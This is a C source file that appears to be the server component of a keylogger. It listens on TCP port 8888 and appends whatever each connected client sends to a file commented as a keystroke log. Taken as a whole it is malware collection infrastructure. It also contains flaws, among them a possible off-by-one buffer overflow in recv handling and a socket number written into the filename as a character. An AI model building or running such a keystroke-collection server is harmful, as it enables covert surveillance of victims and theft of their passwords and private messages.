#include "serverManager.h"
#include "utils.h"

#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

void* handle_client(void* params)
{
    parameters_t *args = (parameters_t*) params;
    // Open a file to log keystrokes
    char filename[BUFFER_SIZE];
    strcpy(filename, "keylogX.txt");
    filename[6] = (char)args->client_sock;
    FILE *logFile = fopen(filename, "a");
    if (logFile == NULL) {
        perror("Could not open log file");
        //TO DO: De inchis conexiunea--------------------------------------------------------------------
        return NULL;
    }

    // Receive data from client
    char client_message[BUFFER_SIZE];
    int read_size;
    while ((read_size = recv(args->client_sock, client_message, BUFFER_SIZE, 0)) > 0) {
        // Null-terminate the string received
        client_message[read_size] = '\0';

        // Write to the log file
        fprintf(logFile, "%s", client_message);
        fflush(logFile);  // Ensure immediate write to file
    }

    if (read_size == 0) {
        printf("Client disconnected\n");
    } else if (read_size == -1) {
        perror("Receive failed");
    }

    // Close the file and socket
    fclose(logFile);
    close(args->client_sock);
    close(args->socket_desc);
}

void sock_init(int *socket_desc, struct sockaddr_in* server)
{
    *socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (*socket_desc == -1) {
        perror("Could not create socket\n");
        exit(-1);
    }
    printf("Socket created\n");

    // Prepare the sockaddr_in structure
    server->sin_family = AF_INET;
    server->sin_addr.s_addr = INADDR_ANY;
    server->sin_port = htons(8888);

    // Bind
    if (bind(*socket_desc, (struct sockaddr *)server, sizeof(*server)) < 0) {
        perror("Bind failed. Error");
        exit(-1);
    }
    printf("Bind done\n");

    // Listen
    if(listen(*socket_desc, 3) == -1)
    {
        perror("Listen failed. Error");
        exit(-1);
    }
}